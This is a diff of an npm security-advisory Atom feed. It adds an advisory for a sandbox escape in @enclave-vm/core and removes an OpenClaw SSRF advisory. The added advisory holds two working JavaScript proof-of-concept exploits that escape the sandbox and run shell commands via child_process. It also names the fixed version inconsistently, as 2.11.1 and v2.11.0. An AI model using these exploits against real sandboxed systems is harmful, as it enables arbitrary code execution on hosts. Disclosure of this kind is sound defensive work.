@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/npm.rss</id>
     <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
-    <updated>2026-02-25T16:50:04.286Z</updated>
+    <updated>2026-02-25T17:45:51.270Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
     <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
@@ -11,6 +11,118 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[@enclave-vm/core] @enclave-vm/core is vulnerable to Sandbox Escape]]></title>
+        <id>https://github.com/advisories/GHSA-f229-3862-4942</id>
+        <link href="https://github.com/advisories/GHSA-f229-3862-4942"/>
+        <updated>2026-02-25T17:26:24.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>It is possible to escape the security boundraries set by <code>@enclave-vm/core</code>, which can be used to achieve remote code execution (RCE).</p>
+<p>The issue has been fixed in version <strong>2.11.1</strong>.</p>
+<hr>
+<h2 id="details">Details</h2>
+<p>It is possible to obtain the native <code>Object</code> constructor (instead of the <code>SafeObject</code> wrapper). This can be used to get retrieve property descriptors via <code>Object.getOwnPropertyDescriptors</code>, allowing access to properties otherwise restricted by the sandbox.</p>
+<p>When a memory limit is set (which is the default), <code>__host_memory_track__</code>, a host object, can be used to escape via the host function constructor.</p>
+<p>When this is not the case, a host reference can be obtained via Node's <code>nodejs.util.inspect.custom</code> symbol (which can be triggered, for example, through <code>console.log</code>).</p>
+<hr>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<h3 id="poc-1">PoC 1</h3>
+<pre><code class="language-js">const { Enclave } = require("@enclave-vm/core");
+
+const enclave = new Enclave({
+  securityLevel: "SECURE",
+  toolHandler: () =&gt; {},
+});
+
+const result = enclave.run(`
+const op = {}[["__proto__"]];
+const ho = op[["constructor"]];
+
+const glob = ho.getOwnPropertyDescriptors(this);
+
+return {
+  res: glob.__host_memory_track__.value[["constructor"]]("return process")()
+    .getBuiltinModule("child_process")
+    .execSync("id")
+    .toString()
+    .split("\\n"),
+};`);
+
+result
+  .then((v) =&gt; console.log("success", v))
+  .catch((e) =&gt; console.log("failure", e));
+</code></pre>
+<hr>
+<h3 id="poc-2">PoC 2</h3>
+<pre><code class="language-js">const { Enclave } = require("@enclave-vm/core");
+
+const enclave = new Enclave({
+  securityLevel: "STRICT",
+  toolHandler: () =&gt; {},
+  memoryLimit: 0,
+});
+
+const result = enclave.run(`
+const op = {}[['__proto__']];
+const ho = op[['constructor']];
+
+const glob = ho.getOwnPropertyDescriptors(this);
+
+const sym = glob[['Symbol']].value.for('nodejs.util.inspect.custom');
+
+let result;
+const obj = {
+  [sym]: (depth, option, inspect) =&gt; {
+    result = inspect[['constructor']]
+      [['constructor']]('return process')()
+      .getBuiltinModule('child_process')
+      .execSync('id')
+      .toString();
+  },
+};
+
+glob.__safe_console.value.log(obj);
+return { result }
+`);
+
+result
+  .then((v) =&gt; console.log("success", v))
+  .catch((e) =&gt; console.log("failure", e));
+</code></pre>
+<hr>
+<h2 id="impact">Impact</h2>
+<p>This vulnerability allows a malicious actor executing untrusted code inside an Enclave instance to escape the sandbox and execute arbitrary commands on the host system.</p>
+<p>This constitutes <strong>Remote Code Execution (RCE)</strong> and should be considered <strong>Critical severity</strong>.</p>
+<hr>
+<h2 id="remediation">Remediation</h2>
+<p>The issue has been fixed in <strong>v2.11.0</strong> with the following hardening measures:</p>
+<ul>
+<li>Strengthened intrinsic object isolation</li>
+<li>Improved console isolation</li>
+<li>Hardened host callback exposure paths</li>
+<li>Closed AST validation gaps</li>
+<li>Added additional defensive checks around constructor access and prototype traversal</li>
+</ul>
+<p>All known escape paths demonstrated in the PoCs are now blocked.</p>
+<p>Users are strongly advised to upgrade to <strong>v2.11.1</strong> or later immediately.</p>
+<hr>
+<h2 id="credit">Credit</h2>
+<p>Enclave would like to thank <strong>@c0rydoras</strong> for responsibly reporting this issue and for providing detailed proof-of-concept examples.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/agentfront/enclave/security/advisories/GHSA-f229-3862-4942">https://github.com/agentfront/enclave/security/advisories/GHSA-f229-3862-4942</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-27597">https://nvd.nist.gov/vuln/detail/CVE-2026-27597</a></li>
+<li><a href="https://github.com/advisories/GHSA-f229-3862-4942">https://github.com/advisories/GHSA-f229-3862-4942</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-f229-3862-4942</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-02-25T17:26:23.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[repostat] repostat: Reflected Cross-Site Scripting (XSS) via repo prop in RepoCard]]></title>
         <id>https://github.com/advisories/GHSA-fm8c-6m29-rp6j</id>
@@ -908,39 +1020,5 @@ await client.email.to('...').subject('...').html('...').send();
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-02-20T21:14:49.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[openclaw] OpenClaw hardened cron webhook delivery against SSRF]]></title>
-        <id>https://github.com/advisories/GHSA-w45g-5746-x9fp</id>
-        <link href="https://github.com/advisories/GHSA-w45g-5746-x9fp"/>
-        <updated>2026-02-23T22:29:48.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="affected-packages--versions">Affected Packages / Versions</h2>
-<ul>
-<li><code>openclaw</code> npm package versions <code>&lt;= 2026.2.17</code>.</li>
-</ul>
-<h2 id="vulnerability">Vulnerability</h2>
-<p>Cron webhook delivery in <code>src/gateway/server-cron.ts</code> used <code>fetch()</code> directly, so webhook targets could reach private/metadata/internal endpoints without SSRF policy checks.</p>
-<h2 id="fix-commits">Fix Commit(s)</h2>
-<ul>
-<li><code>99db4d13e</code></li>
-<li><code>35851cdaf</code></li>
-</ul>
-<p>Thanks @Adam55A-code for reporting.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-w45g-5746-x9fp">https://github.com/openclaw/openclaw/security/advisories/GHSA-w45g-5746-x9fp</a></li>
-<li><a href="https://github.com/openclaw/openclaw/commit/99db4d13e5c139883ef0def9ff963e9273179655">https://github.com/openclaw/openclaw/commit/99db4d13e5c139883ef0def9ff963e9273179655</a></li>
-<li><a href="https://github.com/openclaw/openclaw/releases/tag/v2026.2.19">https://github.com/openclaw/openclaw/releases/tag/v2026.2.19</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-27488">https://nvd.nist.gov/vuln/detail/CVE-2026-27488</a></li>
-<li><a href="https://github.com/advisories/GHSA-w45g-5746-x9fp">https://github.com/advisories/GHSA-w45g-5746-x9fp</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-w45g-5746-x9fp</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-02-20T21:13:03.000Z</published>
     </entry>
 </feed>
